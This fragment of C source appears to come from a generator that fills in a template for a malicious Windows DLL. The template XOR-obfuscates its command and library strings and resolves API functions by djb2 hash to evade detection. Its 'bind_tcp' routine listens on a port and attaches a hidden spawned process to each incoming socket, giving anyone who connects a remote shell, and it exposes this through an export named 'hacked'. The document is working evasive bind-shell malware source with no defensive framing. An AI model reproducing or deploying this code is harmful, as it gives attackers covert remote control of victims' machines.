        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"



        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "htons_t phtons;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "bind_t pbind;\n"
        "listen_t plisten;\n"
        "accept_t paccept;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtClose_t pNtClose;\n\n"
        "void zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void bind_tcp() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    struct sockaddr_in server_addr, client_addr;\n"
        "    int client_addr_len = sizeof(client_addr);\n"
        "    WSADATA wsa;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsa);\n"
        "    SOCKET listen_socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (listen_socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    server_addr.sin_family = AF_INET;\n"
        "    server_addr.sin_port = phtons(%d);\n"
        "    server_addr.sin_addr.s_addr = INADDR_ANY;\n"
        "    if (pbind(listen_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(listen_socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    if (plisten(listen_socket, SOMAXCONN) == SOCKET_ERROR) {\n"
        "        pclosesocket(listen_socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        SOCKET client_socket = paccept(listen_socket, (SOCKADDR*)&client_addr, &client_addr_len);\n"
        "        if (client_socket == INVALID_SOCKET) {\n"
        "            pclosesocket(listen_socket);\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        ZeroMemory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client_socket;\n"
        "        si.wShowWindow = SW_HIDE;\n"
        "        pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 5) {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(client_socket);\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, NULL);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(client_socket);\n"
        "        }\n"
        "    }\n"
        "    pclosesocket(listen_socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"

        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pbind = (bind_t)GetProcAddressH(hWs2_32, bind_djb2);\n"
        "    plisten = (listen_t)GetProcAddressH(hWs2_32, listen_djb2);\n"
        "    paccept = (accept_t)GetProcAddressH(hWs2_32, accept_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "VOID run() {\n"
        "    Inisialize_struct();\n"
        "    bind_tcp();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obf_cmd, obf_ws2dll, port
    );
}












